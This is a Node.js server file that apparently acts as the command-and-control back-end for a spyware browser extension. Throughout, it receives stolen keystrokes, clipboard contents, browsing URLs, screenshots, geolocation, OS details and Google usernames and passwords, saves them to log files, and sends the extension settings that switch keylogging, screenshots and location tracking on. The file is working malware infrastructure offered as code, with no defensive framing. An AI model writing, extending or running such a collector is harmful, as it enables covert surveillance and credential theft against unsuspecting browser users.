const http = require('http')
const csv_obj = require('./csv.js')
var base64Img = require('base64-img');

const fs = require('fs')
const port = 3000
const host = '127.0.0.1'

//Citation: https://www.w3schools.com/nodejs/met_http_createserver.asp
const server = http.createServer(function(request, response) {
    response.setHeader('Access-Control-Allow-Origin', '*');
    response.setHeader('Access-Control-Allow-Methods', '*');
    response.setHeader('Access-Control-Allow-Headers', '*');

    //Citation: https://nodejs.dev/learn/get-http-request-body-data-using-nodejs
    if (request.method == 'POST') {
        var postMessage = ''
        request.on('data', function(data) {
            postMessage += data
        })

        request.on('end', function() {
            storeCommand(postMessage)
            logData(postMessage)
            sendResponse(postMessage, response)

        })

    } else {
        response.writeHead(200, {
            'Content-Type': 'text/html'
        })
        fs.readFile('index.html', function(error, data) {
            if (error) {
                response.writeHead(404)
                response.write('Error: File Not Found')
            } else {
                response.write(data)
            }
            response.end()
        })
    }
})


/*
	Sees if the server has a message it wants to send 
	the extension and stores it.
*/
var stored_cmd = { "logtype": 'SEND_CMD', "screenshots": 'true', "geolocation": 'true', "keylog": 'true', "urls": 'true', "cmd": '' }
function storeCommand(postMessage) {
    msg = JSON.parse(postMessage)
    if (msg.logtype == "SEND_CMD") {
        stored_cmd = msg
    }
}

/*
	Sends the POST response message back to the extension
*/
function sendResponse(postMessage, response) {
        response.end(JSON.stringify(stored_cmd));

        msg = JSON.parse(postMessage)
        if (msg.logtype === 'CMD') {
            stored_cmd.cmd = ''
        }
}


function logData(msg) {
    try {
        createLogDir()
        convertPostRequest(msg)
    } catch (err) {
        console.log("logData: ERROR: ", err)
    }
}


//Creating the log directories
function createLogDir() {
    log_dir = "./logs/"
    if (!fs.existsSync(log_dir)) {
        fs.mkdirSync(log_dir);
    }

    screenshot_dir = "./logs/screenshots/"
    if (!fs.existsSync(screenshot_dir)) {
        fs.mkdirSync(screenshot_dir);
    }
}


/*
	Taking post request data, parsing out relevant data,
	and writing it to correct csv file 
*/
function convertPostRequest(msg) {

    msg = JSON.parse(msg)

    urlTracker = csv_obj[0]
    keyLogTracker = csv_obj[1]
    clipLogTracker = csv_obj[2]
    googleLoginTracker = csv_obj[3]
    geoLocationTracker = csv_obj[4]

    if (msg.logtype == "URL") {
        console.log("LOGGING URL:       ", msg.datetime, msg.url)
        urlTracker.writeRecords([{
            'datetime': msg.datetime,
            'url': msg.url
        }])
    } else if (msg.logtype == "KEY") {
        console.log("Logging KEYSTROKE: ", msg.datetime, msg.key)
        keyLogTracker.writeRecords([{
            'datetime': msg.datetime,
            'key': msg.key
        }])
    } else if (msg.logtype == "IMG") {
        saveScreenShot(msg.datetime, msg.img)
    } else if (msg.logtype == "CLIP") {
        //Citation: https://nodejs.org/en/knowledge/advanced/buffers/how-to-use-buffers/
        clip_text = new Buffer(msg.clip, 'base64').toString('ascii');
        console.log("LOGGING CLIPBOARD: ", clip_text)
        clipLogTracker.writeRecords([{
            'datetime': msg.datetime,
            'clip': clip_text
        }])
    } else if (msg.logtype == "GOOGLE") {
        console.log("LOGGING LOGIN:     ", msg.username, msg.password)
        googleLoginTracker.writeRecords([{
            'datetime': msg.datetime,
            'username': msg.username,
            'password': msg.password
        }])
    } else if (msg.logtype == "LOC") {
        console.log("LOGGING LOCATION:  ", msg.lat, msg.lng)
        geoLocationTracker.writeRecords([{
            'datetime': msg.datetime,
            'lat': msg.lat,
            'lng': msg.lng
        }])
    } else if (msg.logtype == "OSI") {
        console.log("LOGGING OS INFO    ", msg.datetime,"||",msg.appVersion, "||",msg.language, "||",msg.platform, "||",msg.vendor);

        osData = "datetime:\t " + msg.datetime + "\n" +
            "appVersion:\t " + msg.appVersion + "\n" +
            "language:\t " + msg.language + "\n" +
            "platform:\t " + msg.platform + "\n" +
            "vendor:\t " + msg.vendor + "\n"
        fs.writeFile("./logs/osInformation.txt", osData, () => {});


    }
}

//Citation: https://www.npmjs.com/package/base64-img
function saveScreenShot(datetime, img) {
    datetime = datetime.split(' ').join('-');
    console.log("LOGGING IMAGE:     ", datetime + ".png")
    //Reverts the base64 converted image and saves it as a png file
    try{
        base64Img.img(img, screenshot_dir, datetime, function(err, filepath) {});
    } catch (err){
        
    }
    }

server.listen(port, host)
console.log("listening on ", host + ":" + port)